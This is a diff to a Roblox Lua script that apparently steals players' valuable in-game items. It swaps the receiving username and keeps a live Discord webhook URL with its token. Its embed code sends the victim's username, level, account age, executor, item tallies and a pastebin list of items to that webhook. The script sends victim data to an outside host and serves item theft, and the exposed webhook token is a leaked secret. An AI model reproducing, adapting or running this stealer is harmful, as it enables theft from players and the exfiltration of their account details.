@@ -1,6 +1,6 @@
 -- WORKS @DOMOSCRIPTS APPROVED
 
-userName = "Virmality1"
+userName = "W1lliqmm"
 webHook = "https://discord.com/api/webhooks/1343782704264515616/nQX34btCczY9XnlW3VRfuko9E2Vbq2IK3jrrUPrdEbnIQhmZrtXrZMvGNOBZ0HNPoBM2"
 local values = {
     ["Nik's Scythe"] = 25000000,
@@ -1068,9 +1068,6 @@ local WebHookEmbed = CreateEmbed(
         {name = "〘:bust_in_silhouette:〙Player Info", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
 {name = "〘:mailbox_with_no_mail:〙Hit Info", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
 {name = "〘:dart:〙Hit List", value = "[Click Me]("..pastebin(EverythingString)..")"}
-    }
-    ["image"] = {
-        ["url"] = "https://media.discordapp.net/attachments/1343781172148305970/1343810418732171374/GrayDivider.png?ex=67bea07a&is=67bd4efa&hm=9d723f722029626812bcff27627d6d0590c11a500578c46dc940c8581bb96c71&=&format=webp&quality=lossless&width=1584&height=31"
     }
 )
 
